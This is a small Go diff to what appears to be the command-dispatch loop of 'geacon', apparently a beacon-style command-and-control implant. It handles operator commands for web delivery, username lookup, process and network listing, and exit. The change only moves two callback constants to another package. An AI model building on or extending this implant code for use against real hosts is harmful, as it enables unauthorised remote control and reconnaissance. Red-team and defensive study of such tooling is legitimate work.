@@ -108,7 +108,7 @@ func main() {
 							case command.CMD_TYPE_WEB_DELIVERY:
 								command.WebDelivery(cmdBuf)
 							case command.CMD_TYPE_GET_UID:
-								packet.PushResult(command.CALLBACK_OUTPUT, []byte(sysinfo.GetUsername()))
+								packet.PushResult(packet.CALLBACK_OUTPUT, []byte(sysinfo.GetUsername()))
 							// even there is a CALLBACK_PROCESS_LIST, but still use PENDING
 							case command.CMD_TYPE_PS:
 								execErr = command.ListProcess(cmdBuf)
@@ -141,7 +141,7 @@ func main() {
 							case command.CMD_TYPE_LIST_NETWORK:
 								execErr = command.GetNetworkInformation(cmdBuf)
 							case command.CMD_TYPE_EXIT:
-								packet.PushResult(command.CALLBACK_DEAD, []byte("exit"))
+								packet.PushResult(packet.CALLBACK_DEAD, []byte("exit"))
 								os.Exit(0)
 							default:
 								errMsg := fmt.Sprintf("command type %d is not support by geacon now\n", cmdType)
